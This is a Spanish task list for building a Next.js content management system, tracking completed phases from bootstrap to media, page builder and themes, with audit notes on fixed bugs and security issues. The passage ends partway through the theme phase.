# CSM — Lista de tareas

> Plan maestro: `C:\Users\edgar\.claude\plans\glimmering-booping-storm.md`
> Cada fase deja el sistema utilizable y deployable.

## ✅ Fase 0 — Bootstrap (COMPLETA)
- [x] Resolver gestor de paquetes (npm en lugar de pnpm — corepack bloqueado)
- [x] `tasks/todo.md` y `tasks/lessons.md`
- [x] `package.json` con scripts y deps
- [x] `tsconfig.json` strict
- [x] `next.config.ts` con outputFileTracingRoot, headers, image domains
- [x] Tailwind v4 + `globals.css` con tokens OKLCH (light/dark/system)
- [x] `biome.json` (lint+format)
- [x] `.env.example` + `.env` con defaults + `@t3-oss/env-nextjs`
- [x] `drizzle.config.ts` + `src/db/schema.ts` (28 tablas: workspaces, users, members, sessions, accounts, verifications, collections, branches, entries, revisions, taxonomies, terms, entry_terms, media_folders, media, comments, subscribers, segments, campaigns, tiers, memberships, forms, submissions, api_keys, webhooks, automations, themes, menus, redirects, settings, activity_log, notifications, analytics_events)
- [x] `src/db/client.ts` (lazy con feature flags)
- [x] `src/db/seed.ts` (workspace demo + colecciones builtin)
- [x] Better-Auth config (lazy si no hay DB)
- [x] `src/app/layout.tsx` con Geist Sans/Mono y ThemeProvider
- [x] `src/components/theme-provider.tsx` + `theme-toggle.tsx`
- [x] Página `/` espectacular: AuroraBackground, Hero, Features (12), WhyCSM (vs WordPress), Stack, Roadmap, CTA, Footer
- [x] Página `/admin` placeholder con onda
- [x] `not-found.tsx` y `loading.tsx`
- [x] UI primitives: Button (7 variants), Card, Badge
- [x] `components.json` shadcn config
- [x] `.gitignore` + `README.md` espectacular
- [x] `npm run build` ✅ (3 rutas estáticas, 117 KB First Load)
- [x] `npm run dev` ✅ (HTTP 200 en / y /admin)

**Estado:** sistema arranca, build pasa, landing visible, schema completo en código (falta `db:push` cuando haya DATABASE_URL).

---

## ✅ Fase 1 — Auth + Multi-tenant + Onboarding mágico ✦ Edición Espectacular (COMPLETA)

> Mejoras vs plan original: 2FA TOTP día 1, AI Site Generator streaming SSE, OG dinámica de invitaciones, magic-link con fallback dev, chips de prompts, slug-check live, confetti final, dashboard con KPIs reales.

### Auth core
- [x] `app/api/auth/[...all]/route.ts` (Better-Auth handler con fallback 503 si DB off)
- [x] `src/auth/server.ts` (`getSession`, `getCurrentUser`, `requireUser`, `requireGuest`)
- [x] `src/auth/client.ts` (Better-Auth React client con plugins twoFactor + magicLink)
- [x] Plugins: twoFactor (TOTP), magicLink en `src/auth/index.ts` *(passkey pendiente: no exportado en better-auth 1.6.9)*
- [x] Schema: tablas `passkeys`, `two_factors` añadidas; campo `users.onboardedAt`, `users.twoFactorEnabled`
- [x] Middleware `src/middleware.ts` protege `/admin` y `/onboarding`, redirige autenticados de `/login`,`/registro`,`/olvide`

### Plataforma (helpers)
- [x] `src/lib/email.ts` (Resend con fallback dev: imprime link en consola)
- [x] `src/lib/activity.ts` (`logActivity({ ws, actor, action, target, meta })`)
- [x] `src/lib/workspace.ts` (`currentWorkspace`, `requireWorkspace`, `withWorkspace`, ABAC `can()`, cookie `csm_ws`)
- [x] `src/lib/slug.ts` (slugify + suffix anti-colisión + reservados + accent map)

### UI primitives extra
- [x] `src/components/ui/{input,label,separator,textarea}.tsx`
- [x] `src/components/auth/{oauth-buttons,auth-shell,login-form,register-form,forgot-form}.tsx`
- [x] `src/components/onboarding/{stepper,prompt-chips,palette-preview,confetti}.tsx`

### Auth pages
- [x] `src/app/(auth)/layout.tsx` (route group; gradient mesh OKLCH en `AuthShell`)
- [x] `src/app/(auth)/login/page.tsx` (email+pass, OAuth condicional, magic-link toggle, passkey CTA "soon")
- [x] `src/app/(auth)/registro/page.tsx` → redirige a `/onboarding`
- [x] `src/app/(auth)/olvide/page.tsx` (magic link como recovery)

### Onboarding wizard (4 pasos)
- [x] `src/app/onboarding/page.tsx` (server: requireUser + features check)
- [x] Paso 1: Cuéntanos qué construyes (textarea + 4 chips ejemplo)
- [x] Paso 2: Brand stream (nombre + tagline + paleta OKLCH animada + fuente + slug live editable)
- [x] Paso 3: 5 categorías + 3 posts demo (skeleton shimmer mientras streamea)
- [x] Paso 4: ¡Listo! con confetti + CTA `/admin`
- [x] `src/app/api/onboarding/generate/route.ts` (SSE stream con eventos tipados)
- [x] `src/lib/site-generator.ts` (8 paletas curadas + posts/categorías keyword-aware; mock determinista)
- [x] `src/app/onboarding/_actions.ts` (createSiteFromOnboarding: workspace + member + collections + taxonomy + entries + activity log + cookie)

### Invitaciones
- [x] `src/app/api/invitations/[token]/route.ts` (GET info + POST aceptar; expiración 7d)
- [x] `src/app/(auth)/invitacion/[token]/page.tsx` (muestra invitante + workspace + role + redirect a login si guest)
- [x] `src/app/api/og/invitation/route.tsx` (@vercel/og edge dinámica con gradient + nombres)

### Admin shell
- [x] `src/app/admin/layout.tsx` (protegido, redirige a `/onboarding` si user sin workspace)
- [x] `src/components/admin/topbar.tsx` (logo + workspace switcher + buscador placeholder + theme toggle + UserMenu)
- [x] `src/components/admin/sidebar.tsx` (3 secciones, 14 items con badge "pronto")
- [x] `src/components/admin/workspace-switcher.tsx` (popover con avatares + crear workspace)
- [x] `src/components/admin/user-menu.tsx` (avatar + signOut + perfil/ajustes)
- [x] `src/app/admin/page.tsx` reemplazado por dashboard real con KPIs (entries/subscribers/members/comments)

### Verificación
- [x] `npm run typecheck` cero errores
- [x] `npm run build` ✅ (12 rutas, middleware 34.4 kB, /onboarding 8.31 kB)
- [x] Smoke `/`, `/login`, `/registro`, `/olvide`, `/invitacion/test` → 200
- [x] Smoke `/admin`, `/onboarding` sin sesión → 307 redirect a `/login` (middleware OK)
- [x] Smoke `/api/og/invitation?ws=Demo&by=Ana` → 200, 116 KB PNG
- [x] `tasks/lessons.md` actualizado con 5 aprendizajes nuevos

## ✅ Fase 2 — Dashboard + Editor + Posts + Blog público (COMPLETA)

> Mejoras vs plan: dashboard con sparklines SVG propias (cero deps de charts), feed de actividad real con Intl.RelativeTimeFormat, side panel con tabs Publicar/SEO, Bubble menu Tiptap, slash menu propio con 13 bloques, ⌘S y ⌘J shortcuts, JSON-LD Article + OG Twitter, render público sin Tiptap en cliente.

### ⌘K Command palette
- [x] `src/components/admin/command-palette.tsx` con cmdk Dialog + provider
- [x] `CommandPaletteProvider` montado en admin layout
- [x] `CommandPaletteTrigger` en topbar (sustituye al placeholder)
- [x] Atajo ⌘K global, esc cierra
- [x] Grupos: Acciones (Crear entrada), Ir a (16 secciones), Workspaces (switch), Apariencia (tema), Sesión
- [x] Footer con kbd hints (↑↓ navegar · ↵ seleccionar)

### Dashboard espectacular
- [x] `src/lib/dashboard.ts` con `loadDashboardKpis`, `loadRecentActivity`, `loadTopPosts` (queries paralelas)
- [x] `Sparkline` SVG inline (cero deps) con áreas + trazo
- [x] `KpiCard` con tendencia % auto-calculada (mitad inicial vs final), arrow up/down
- [x] `HeroGreeting` cliente: saludo según hora (mañana/tarde/noche), CTA gradient
- [x] `ActivityFeed` con avatares, iconos por acción y `RelativeTime` que se refresca solo
- [x] `TopPosts` con link al editor + link público
- [x] `EmptyState` cuando workspace tiene 0 entradas (CTA + tips)
- [x] Server actions `createNewPostAction` consumida por forms

### Lista de Posts /admin/contenido
- [x] `src/app/admin/contenido/page.tsx` server con searchParams (status, q, page)
- [x] `StatusTabs` con counts por estado y enlaces preserve params
- [x] `SearchInput` debounced 250ms vía router.replace
- [x] `PostsTable` con TanStack Table client-side, sort, selección con checkbox custom
- [x] Bulk actions: publish/unpublish/archive/delete con toast + ConfirmDialog para delete
- [x] Pagination simple anterior/siguiente

### Editor /admin/contenido/[id]
- [x] `src/components/admin/editor/editor-shell.tsx` con `useEditor` (immediatelyRender:false SSR-safe)
- [x] Extensiones Tiptap: StarterKit, Underline, Link, Image, Placeholder, Highlight, Typography, TextAlign, TaskList, TaskItem, Table+TableRow+Cell+Header, CodeBlockLowlight, CharacterCount
- [x] `slash-menu.tsx`: extension custom con `@tiptap/suggestion`, popup React posicionado fixed via clientRect, 13 bloques (texto, h1-h3, listas, task, cita, código, divider, tabla, imagen, AI Inline)
- [x] `bubble-toolbar.tsx`: BubbleMenu de selección con 14 acciones (B/I/U/strike/highlight/code, h1-h3, listas, cita, link/unlink)
- [x] `side-panel.tsx`: tabs Publicar/SEO con slug, excerpt, scheduled, SEO title/description/og
- [x] Title `<textarea>` auto-resize 4xl→5xl
- [x] Stats live: palabras / caracteres / minutos lectura
- [x] Atajos ⌘S (guardar) y ⌘J (AI Inline placeholder con toast info)
- [x] beforeunload guard si dirty

### Autosave + Revisiones
- [x] `saveEntryAction` con z.input schema, server transaction, snapshot revisión cada 5min OR 200 char delta
- [x] `bodyText` se recalcula y guarda
- [x] `slug` re-validado con `ensureUniqueEntrySlug` (locale-aware)
- [x] Indicador en topbar: Guardado (✓) / Guardando (loader) / Cambios sin guardar (warning) / Error
- [x] Debounce 1.5s después del último cambio
- [x] `RevisionsPanel` slide-over Radix Dialog con lista + diff `diff.diffWords` + restore
- [x] `restoreRevisionAction` crea snapshot del estado actual antes de restaurar
- [x] `/api/admin/revisions/[id]` route para fetch on-demand del bodyText

### Live Preview multi-device
- [x] `PreviewPane` split: device toggle (mobile 390/tablet 820/desktop 1280)
- [x] `/preview/[id]/page.tsx` server protegido por `requireWorkspace`
- [x] Refresh por incremento `refreshKey` que reescribe `iframe.src` tras cada save
- [x] BroadcastChannel `csm:preview:{id}` (futuro: pestaña externa)
- [x] Middleware protege `/preview/:path*`

### Render público /blog
- [x] `renderDoc(body)` JSON→React: doc, paragraph, heading (con id auto para anchor), blockquote, listas, taskList, codeBlock, hr, image, table completa, marks (bold/italic/underline/strike/code/highlight/link)
- [x] `buildToc()` autogenerado (h2-h4) con anchors
- [x] `readingTimeMinutes()` (220 wpm)
- [x] `/blog/page.tsx` index con grid 2 cols + workspace badge
- [x] `/blog/[slug]/page.tsx` con hero + ToC + render + footer
- [x] SEO completo: metadata dinámica, alternates canonical, OpenGraph article + Twitter card
- [x] JSON-LD Article inline con publisher, datePublished, dateModified
- [x] ISR `revalidate = 60` + revalidateTag por save

### Verificación
- [x] `npm run typecheck` cero errores
- [x] `npm run build` ✅ (16 rutas, /admin/contenido/[id] 349 kB First Load — incluye Tiptap)
- [x] Smoke: `/` 200, `/login` 200, `/admin` 307, `/admin/contenido` 307, `/blog` 200, `/preview/foo` 307 (middleware), `/api/admin/revisions/foo` 307

### Auditoría posterior — bugs detectados y fixeados
- [x] **Critical**: revisión orderBy ASC → DESC (snapshot incorrecto)
- [x] **High**: createNewPostAction imperativa no navegaba (split: form + imperative)
- [x] **High**: timezone shift en datetime-local (helper toLocalDateTimeInput)
- [x] **High**: race en `getOrCreateBuiltinCollection` y `createEntry` (onConflictDoNothing + retry-on-23505)
- [x] **Medium**: `/blog` ISR roto por cookies en `getDefaultPublicWorkspace`
- [x] **Medium**: UUID validation en /preview, /admin/contenido/[id], /api/admin/revisions/[id]
- [x] **Medium**: middleware ahora protege /preview
- [x] **Medium**: sidebar active state para rutas anidadas
- [x] **Medium**: editor metadata dinámica con generateMetadata
- [x] **Medium**: posts demo del onboarding ahora con body Tiptap JSON
- [x] **Medium**: `dashboard.ts` usa tabla Drizzle members (no SQL raw)
- [x] **Medium**: `restoreRevisionAction` con filtro defensivo de workspace + revalidate /blog
- [x] **Medium**: `entry.scheduled` con label en activity feed
- [x] **Medium**: JSON-LD escape `<` para evitar `</script>` injection
- [x] **Low**: title textarea auto-resize en mount
- [x] **Low**: slash menu boundary check (flip-up + horizontal clamp)
- [x] **Low**: dead code useEffect removido
- [x] **Low**: keys de render-doc con `keyOf()` helper
- [x] **Tooling**: regex `\p{Mn}` para diacríticos
- [x] `npx biome check .` cero errores ni warnings

## ✅ Fase 3 — Media Library + DAM ✦ Edición Espectacular (COMPLETA)

> Mejoras vs plan: storage universal con auto-detect (local/UploadThing/Blob/S3), drag-drop GLOBAL en admin, paste from clipboard + URL fetch, procesado completo al subir (variantes responsive AVIF+WebP, blurhash, dominant color, transparency, EXIF strip), grid justified-layout propio, asset detail con focal click&drag y preview live de crops, "Used in" buscando referencias en body JSONB, AI todo con mock determinista (alt-text BLIP→ES, tags, generate Flux→picsum), MediaPicker en editor con 4 tabs.

### Storage adapter universal
- [x] `src/storage/types.ts` + `src/storage/index.ts` con `StorageAdapter { put, get, delete, url, sign }` y `currentStorage()` cacheado
- [x] Adapter `local` (default): `.csm-uploads/ws_{id}/{yyyy-mm}/{nanoid}.{ext}`, sirve por `/api/files/[...key]` con HMAC firmado opcional
- [x] Adapter `vercel-blob` con dynamic import (instalación opcional)
- [x] Adapter `s3` con dynamic import + presigner
- [x] Adapter `uploadthing` stub
- [x] Auto-detect: UploadThing > Vercel Blob > S3 > local; override con `STORAGE_DRIVER`
- [x] `/api/files/[...key]/route.ts` con verificación HMAC + cache-control immutable
- [x] `optional-modules.d.ts` shims TS para SDKs no instalados
- [x] `.gitignore` excluye `.csm-uploads/`

### Schema upgrade
- [x] `media.variants` jsonb (estructura `{ original, sizes: { thumb/small/medium/large: { avif, webp } } }`)
- [x] `media.tagsManual` text[] separado de `aiTags`
- [x] `media.hasTransparency` bool
- [x] `media.exifStripped` bool
- [x] `media.filename`, `media.duration`
- [x] index `media_ws_created_idx` para sort by date

### Procesado server (sharp + blurhash + nanoid)
- [x] `src/lib/image-processor.ts` con `processAndStoreImage` y `storeRawFile`
- [x] Strip EXIF + auto-orient (sharp.rotate())
- [x] Variantes: thumb 160w / small 480w / medium 1024w / large 2048w (skip si > original)
- [x] Output dual AVIF (q60) + WebP (q78)
- [x] Blurhash 4×3 sobre preview 256×256
- [x] Dominant color (resize 1×1 → hex)
- [x] Transparency detection vía sharp metadata
- [x] Soporte JPEG/PNG/WebP/AVIF/GIF/HEIC/TIFF

### Upload endpoint + signed URLs
- [x] `POST /api/uploads` multipart con `requireWorkspace("author")` + folder via querystring
- [x] Pipeline: receive → process → storage.put → DB insert → return asset
- [x] Multi-file (loop secuencial, paralelo 3 viene del cliente)
- [x] Validación: mime allowlist + size cap 50MB
- [x] `POST /api/uploads/url` con fetch + content-type + size validation
- [x] Activity log `media.upload`

### Uploader cliente (drag-drop global + paste + URL)
- [x] `src/components/admin/uploader/upload-provider.tsx` con context, queue, drop overlay full-screen, paste handler, queue panel bottom-right colapsable
- [x] `paste-url-dialog.tsx` modal Radix
- [x] Paralelismo 3 concurrent
- [x] XHR per-file con upload progress (fetch no expone progress)
- [x] Cancel via xhr.abort()
- [x] Provider montado en `/admin/layout.tsx` envolviendo todo

### DAM /admin/medios
- [x] `src/app/admin/medios/page.tsx` server con searchParams (folder, view, q, type, alt, sort, page, asset)
- [x] `folder-tree.tsx` lateral con count per folder, crear/eliminar inline
- [x] `filter-bar.tsx`: tipo (todo/imágenes/vídeo/audio/docs), alt-missing, view toggle
- [x] `media-grid.tsx` con justified-layout propio (zero-deps): TARGET_ROW_HEIGHT 200, scale-to-fit por fila
- [x] `media-list.tsx` tabla con thumb + datos
- [x] `bulk-bar.tsx` flotante centrado bottom con delete (move-to-folder pendiente F4)
- [x] `empty-state.tsx` con CTA + tips de ⌘V y atajo U
- [x] Atajos: `u` abre uploader, Enter abre detail, Backspace bulk-delete via window event, Esc clear
- [x] Sidebar: badge "pronto" removido de Medios

### Asset detail slide-over
- [x] `asset-detail-panel.tsx` Radix Dialog right-side
- [x] Preview con `<FocalImage>` click&drag — actualiza focal en vivo
- [x] Crops 1:1 / 16:9 / 4:3 / 9:16 con object-position derivado del focal
- [x] Tabs Info / Crops / Usos
- [x] "Used in" via `findAssetUsages()` que busca URL en `entries.body::text ILIKE`
- [x] Edit alt + caption + tags manuales (chips con + Enter)
- [x] Sugerencias de tags desde `aiTags`
- [x] Botones: regenerar alt IA, regenerar tags IA, copiar URL/Markdown/HTML, descargar, eliminar
- [x] Save dirty con indicador en header
- [x] Replace asset (pendiente para iteración futura — base lista)

### MediaPicker en editor
- [x] `src/components/admin/editor/media-picker.tsx` modal Radix con 4 tabs
- [x] Tabs Recientes (search live) / Subir / URL / Generar IA
- [x] Grid 5 cols con thumbs, click selecciona
- [x] Side panel insert: alt, caption, tamaño (small/medium/large/full), alineación (left/center/right/full)
- [x] Preserve focal point en object-position
- [x] Bridge `csm:media-picker:open` y `csm:media-picker:insert` (slash menu dispara open)
- [x] Editor-shell escucha insert y llama `editor.chain().setImage()`
- [x] Slash menu "Imagen" reemplazado: ya no pide URL, abre picker
- [x] `/api/admin/media` para listado client + `/api/admin/media/generate` para IA

### AI features (mock determinista)
- [x] `src/ai/vision.ts` con adapters Hugging Face + Replicate + mock
- [x] `generateAltText`: HF BLIP-large si key, mock = "{filename tokens} en tonos {color hex→nombre ES}"
- [x] `generateTags`: HF ViT si key, mock = filename tokens + color name
- [x] Color hex → nombre español (rojizo/naranja/amarillo/verde/cian/azul/violeta/rosado/grises)
- [x] `generateImage`: Replicate Flux schnell si key, mock = picsum.photos con seed determinista del prompt
- [x] Server actions `regenerateAltAction`, `regenerateTagsAction`, `generateImageAction`
- [x] Wired en asset detail panel (botones "Sugerir con IA" en alt y "Regenerar etiquetas" en tags)
- [x] Wired en MediaPicker tab "Generar IA"
- [x] BG removal y face-detection focal: pendiente (lib `@imgly/background-removal` requiere setup ONNX runtime; el slot AI está listo para añadirlo)

### Verificación
- [x] `npm run typecheck` cero errores
- [x] `npm run build` OK — 21 rutas, /admin/medios 11.6 kB / 150 kB First Load
- [x] `npx biome check ./src` cero errores ni warnings
- [x] Split client/server: `lib/media-types.ts` (mediaKind + tipos) vs `lib/media.ts` (importa sharp) — evita bundling de sharp al cliente
- [x] `tasks/lessons.md` actualizado con aprendizajes Fase 3

### Auditoría posterior — bugs detectados y fixeados
- [x] **Critical**: SSRF en /api/uploads/url → helper `src/lib/ssrf.ts` con DNS lookup + bloqueo IPs privadas + manual redirect re-validation
- [x] **High**: SVG XSS al servir same-origin → svg quitado de ALLOWED_MIME y BLOCKED_EXTS en /api/files
- [x] **High**: archivos huérfanos si insert falla → patrón compensación con `onKeyWritten` callback + `rollback()` en cada try/catch
- [x] **High**: hotkeys (Backspace, 'u') disparaban dentro de Tiptap → helper `src/lib/dom.ts::isEditableTarget()` aplicado a todos los listeners globales
- [x] **High**: paste global robaba imágenes pegadas en el editor → mismo helper isEditableTarget
- [x] **Medium**: queue del uploader nunca limpiaba items done → `finishedAt` + auto-purge tras 6s
- [x] **Medium**: bulk selection sobrevivía cambios de filtro → useEffect reset on `itemsKey(items)`
- [x] **Medium**: nombres duplicados de carpetas → check pre-insert + error en action devuelto al cliente
- [x] **Low**: focal save dirty sin cambio → early-return en setFocal si valores idénticos
- [x] Verificado y NO bug: cross-tenant read en /api/files (modelo URL-pública con 218 bits entropía, igual a UploadThing/Vercel Blob)
- [x] Verificado y NO bug: HMAC sign/verify (timingSafeEqual + length check)
- [x] Verificado y NO bug: SQL injection en findAssetUsages (Drizzle parameterized)
- [x] Verificado y NO bug: multi-tenant isolation (todas las queries filtran workspaceId)
- [x] Verificado y NO bug: client bundle no arrastra sharp (split media-types/media)
- [x] `npm run typecheck` cero errores tras fixes
- [x] `npm run build` OK tras fixes
- [x] `npx biome check ./src` cero errores tras fixes

## ✅ Fase 4 — Collections Builder + Pages + Symbols ✦ Edición Espectacular (COMPLETA)

> Mejoras vs plan: 21 tipos de bloques con specs Zod runtime (no solo "drag-drop" — auto-form generator desde propsSpec por bloque), 20 tipos de campo en colecciones (text/longtext/rich/markdown/slug/url/email/number/boolean/date/datetime/image/gallery/ref/repeater/json/select/multiselect/color/geo), 3 breakpoints (mobile 390/tablet 820/desktop 1280), home page automática (sustituye landing sin migración), render server-side compartido entre admin canvas y público (zero duplicado), resolve recursivo de símbolos (max 4 niveles, anti-cycle), catch-all `/[...slug]` con ISR 60s, ⌘D duplicar, Supr eliminar, ⌘S guardar, autosave 1.5s con beforeunload guard.

### Schema upgrade (DB)
- [x] Tabla `pages` (id, ws_id, path, title, layout JSONB, theme_id, ab_test_id, locale, status enum, seo, isHome, publishedAt, authorId, updatedById)
- [x] Índices: `pages_ws_path_locale_idx` único, `pages_ws_status_idx`
- [x] Tabla `symbols` (id, ws_id, name, slug, description, layout JSONB)
- [x] Índice `symbols_ws_slug_idx` único
- [x] Enum `page_status` ["draft","published","archived"]
- [x] Tipos exportados: Page, NewPage, Symbol, NewSymbol

### Sistema de campos (FieldDef)
- [x] `src/lib/fields.ts`: 20 FieldKind con catálogo (label/group/icon/description) + Zod runtime + defaultValueFor + initialFieldsValues
- [x] Validación recursiva del CollectionSchema (z.lazy para repeater anidado)
- [x] superRefine: detecta keys duplicadas con error path correcto
- [x] readCollectionSchema: parser tolerante con fallback a EMPTY_COLLECTION_SCHEMA

### Lib de colecciones
- [x] `src/lib/collections.ts`: list/get/create/update/delete + ensureUniqueSlug + reservedSlugs (posts, pages, media, users, settings, api, admin) + isReservedCollectionSlug
- [x] Patrón retry-on-23505 con onConflictDoNothing (igual que F1)
- [x] Guard delete builtin: lanza error si isBuiltin
- [x] entryCount via subquery SQL en listCollections

### Lib de pages
- [x] `src/lib/pages.ts`: normalizePath (slug por segmento), isReservedPath (admin/api/login/onboarding/...), list/get/create/update/delete
- [x] ensureUniquePagePath con retry
- [x] updatePage: si isHome=true, des-flagea cualquier otra home del mismo locale (transacción implícita)
- [x] publishedAt auto-set al pasar a "published"
- [x] getPublishedPageByPath + getPublishedHome para render público
- [x] listPublishedPaths (futuro sitemap)

### Lib de symbols
- [x] `src/lib/symbols.ts`: list/get/create/update/delete con normalizeLayout

### Block Registry
- [x] `src/blocks/types.ts`: BlockNode, Breakpoint, RenderContext, ResolvedMedia + helpers (newId, normalizeLayout, flattenLayout, findNode, findParent, updateNode, removeNode, insertNode, moveNode, isDescendant, cloneNodeWithNewIds)
- [x] `src/blocks/registry.ts`: 21 BlockSpec (section, container, columns, heading, text, rich, image, gallery, video, embed, button, cta, hero, features-grid, pricing, testimonials, faq, footer-cols, spacer, divider, symbol)
- [x] Cada spec: kind, label, icon, group (Estructura/Tipografía/Multimedia/Acción/Secciones/Especial), description, canHaveChildren, defaultProps, propsSpec (auto-form), propsSchema (Zod), defaultChildren?
- [x] PropKind: text, longtext, rich, number, boolean, color, select, image, url, spacing, align, icon, items
- [x] validateProps con merge de defaults + parsed data
- [x] newBlockNode con structuredClone para evitar mutación cruzada
- [x] blocksByGroup helper para palette

### Block Render server-side
- [x] `src/blocks/render.tsx`: RenderLayout componente recursivo
- [x] Implementa los 21 bloques con Tailwind tokens consistentes
- [x] Hero con 2 layouts (centered/split) + 3 backgrounds (aurora/grid/solid)
- [x] Features-grid, pricing (highlight), testimonials, FAQ (details/summary), footer-cols (parser "Texto | /url" por línea)
- [x] Image/gallery con next/image + focal point object-position
- [x] Video con embed YouTube/Vimeo (regex normalize URL)
- [x] Symbol resolver con cap recursivo (4 niveles) anti-cycle
- [x] parseInlineMarkdown mínimo (**bold** y *italic*) para texto plano de props

### Block Resolve
- [x] `src/blocks/resolve.ts`: collectRefs (UUIDs en props + items), resolveLayout (mediaMap + symbolMap)
- [x] Loop por niveles (max 4) para resolver símbolos anidados sin ciclos infinitos

### UI Collections
- [x] `/admin/colecciones`: server list con CollectionCard (icono lucide dinámico, badges builtin/singleton, contador entries) + delete confirm
- [x] `/admin/colecciones/[id]`: builder con 3 cols (palette de 20 tipos / fields list sortable / inspector)
- [x] `NewCollectionDialog`: wizard con name+slug autosync+singleton toggle
- [x] Drag-drop con dnd-kit/sortable (PointerSensor distance:4 para evitar trigger accidental en click)
- [x] Inspector por field type: text/longtext min/max/placeholder, number min/max/step, ref refCollection, select/multiselect OptionsEditor con CRUD de opciones
- [x] Toggles globales: required, showInList
- [x] Autosave 1.5s + beforeunload guard
- [x] Save indicator (Listo/Guardando/Guardado/Error)

### UI Entries por colección
- [x] `/admin/contenido/c/[collection]`: reuse PostsTable con StatusTabs (basePath param) + SearchInput + Pagination
- [x] CollectionContentHeader: icono dinámico, "Nueva entrada" imperative action
- [x] Singleton: redirect automático al editor del único entry (auto-create si no existe)
- [x] saveEntryAction extendido para persistir `fields` JSONB
- [x] createEntryInCollectionAction + ensureSingletonEntryAction

### Page Builder visual
- [x] `/admin/paginas`: lista con tabs por status, badges (home/published/draft/archived), CTA crear inline (details/summary popover)
- [x] `/admin/paginas/[id]`: PageBuilder full-screen
- [x] BlockPalette (240px): 21 bloques agrupados, búsqueda live, draggable HTML5 native (dataTransfer "application/csm-block-kind")
- [x] BuilderCanvas: device frames responsive (390/820/1280), drop zones (root + final), selection ring overlay (data-block-id), EmptyCanvas con CTAs rápidos
- [x] BuilderInspector (320px): auto-form generado desde propsSpec por bloque
- [x] PropEditors por kind: text, longtext, url, number, boolean, color (color picker + texto OKLCH), align (3-button grupo), select, icon (preview lucide), image (ImagePicker grid), items (CRUD con reorder up/down + drawer expand)
- [x] Sección "Visibilidad" en inspector: hide por breakpoint (mobile/tablet/desktop)
- [x] Topbar: ArrowBack, título editable abre SettingsDialog (path, isHome, SEO), breakpoint switcher (Monitor/Tablet/Smartphone), Save indicator, Ver en pestaña, Publicar/Despublicar
- [x] SettingsDialog: title, path, isHome (Switch), SEO title/description
- [x] Atajos: ⌘S guardar, Supr/Backspace eliminar, ⌘D duplicar, Esc deseleccionar, isEditableTarget guard
- [x] Autosave 1.5s con dirtyRef + beforeunload
- [x] Confirm dialog antes de publicar

### Symbols UI
- [x] `/admin/simbolos`: lista con grid de cards (icono Component) + create dialog inline
- [x] `/admin/simbolos/[id]`: SymbolBuilder = mismo canvas/palette/inspector pero sin path/SEO/publish (símbolos no tienen URL propia)
- [x] saveSymbolAction con revalidatePath("/", "layout") para refrescar todas las pages que usen el símbolo
- [x] Listado de OTROS símbolos pasado al inspector (excluye el actual)

### Render público
- [x] `app/[...slug]/page.tsx` catch-all (NO opcional, no conflicta con `app/page.tsx`)
- [x] Filtro de slugs path-traversal (rechaza segmentos con "/" o que empiezan con ".")
- [x] generateMetadata desde page.seo + workspace name fallback
- [x] ISR `revalidate = 60` + `force-static`
- [x] Render via RenderLayout + resolveLayout (followSymbols)
- [x] `app/page.tsx` modificado: si hay home publicada → renderiza esa, sino landing marketing default

### Sidebar
- [x] Removido badge "pronto" de Colecciones, Páginas
- [x] Añadido item Símbolos con icono Component

### UI primitives extra
- [x] `src/components/ui/select.tsx` (native styled, ChevronDown overlay)
- [x] `src/components/ui/switch.tsx` (button role="switch" sin Radix por simplicidad)

### Verificación
- [x] `npx tsc --noEmit` cero errores
- [x] `npm run build` OK — 33 rutas, /admin/paginas/[id] 343 kB, /admin/colecciones/[id] 327 kB, /[...slug] 111 kB, /admin/simbolos/[id] 331 kB
- [x] `npx biome check ./src` cero errores ni warnings (auto-fix de organizeImports + useImportType)
- [x] Catch-all no rompe routes existentes (/blog, /admin, /login, etc. son explícitas)

### Auditoría posterior — bugs detectados y fixeados
- [x] **Critical**: contentHref roto (singleton + plain) → `/admin/contenido/c/${slug}` unificado
- [x] **Critical**: BuilderInspector violaba Rules of Hooks → split en wrapper + InspectorBody
- [x] **Critical**: updatePage isHome unset fuera de tx + se incluía a sí mismo → tx + ne(id)
- [x] **High**: createPageFormAction sin try/catch → patrón de re-throw NEXT_* / redirect con error
- [x] **High**: savePageAction no revalidaba path viejo (rename) ni `/` (isHome change)
- [x] **High**: deletePageAction no revalidaba path público ni `/` si era home
- [x] **High**: app/page.tsx podía crashear si DB falla → resolveHomePage() con try/catch
- [x] **High**: catch-all `force-static` removido + path validation con `^[a-z0-9-]+$` lowercase + try/catch
- [x] **High**: PageBuilder publish race con setTimeout(refresh) → handleSave async + refresh en transition
- [x] **High**: PageBuilder unpublish sin confirm → ConfirmDialog destructive
- [x] **Medium**: page-builder + paginas list `href={path}` → `encodeURI(path)`
- [x] **Medium**: doble save por timer pendiente (autosave + ⌘S concurrentes) → autosaveTimerRef compartido
- [x] **Low**: import muerto MoreHorizontal en list.tsx
- [x] Verificado y NO bug: multi-tenant isolation, isUuid en rutas dinámicas, ABAC consistente, reserved paths, cycle protection symbols, XSS via React escape, path traversal bloqueado, Symbol global collision (SymbolRow alias), singleton flow OK, catch-all priority OK, noUncheckedIndexedAccess respetado
- [x] `npx tsc --noEmit` cero errores tras fixes
- [x] `npm run build` OK tras fixes (33 rutas, mismas tamaños)
- [x] `npx biome check ./src` cero errores tras fixes

## ✅ Fase 5 — Sitio público + 5 temas + SEO ✦ Edición Espectacular (COMPLETA)

> Mejoras vs plan: ThemeShell con CSS vars scoped que aliasea las globals (`--background`, `--primary`) para que TODOS los bloques de F4 hereden el tema sin tocar render. Theme registry tipado fuerte (no solo "tokens"), 5 temas builtin con tipografías + paletas + radius + sombras + layouts radicalmente distintos. Theme Studio con preview iframe en vivo y device toggle. OG templates por tema (no hardcoded). Author + Tag pages añadidas. JSON Feed 1.1 además de RSS+Atom. Sitemap dinámico que incluye autores.

### Schema upgrade
- [x] `users.handle`, `users.bio`, `users.website`, `users.twitter` + index único en handle
- [x] `workspaces.activeThemeSlug` (default "magazine") + `workspaces.ogTemplate` jsonb
- [x] `themes` reescrita: name, description, basedOn, fonts, blockOverrides, ogTemplate, timestamps + uniqueIndex (ws,slug)
- [x] Tipos exportados: `Theme`, `NewTheme`

### Theme registry
- [x] `src/themes/types.ts` — ThemeSpec con tokens (colors light+dark, radius, shadow, fonts, motion), layouts (post/list/hero + flags ToC/author/reading/related/share/subscribe), blockStyles, ogTemplate
- [x] `src/themes/builtins.ts` — 5 temas con tokens OKLCH propios:
  - **Magazine**: editorial, Lora serif, sharp radius, hero magazine, capitulares
  - **Portfolio**: minimal, monocromático, radius=0, animaciones largas
  - **Docs**: violeta + cyan accent, sidebar con ToC sticky, layout 3-col
  - **Storefront**: neón, radius generoso, glow, CTAs uppercase
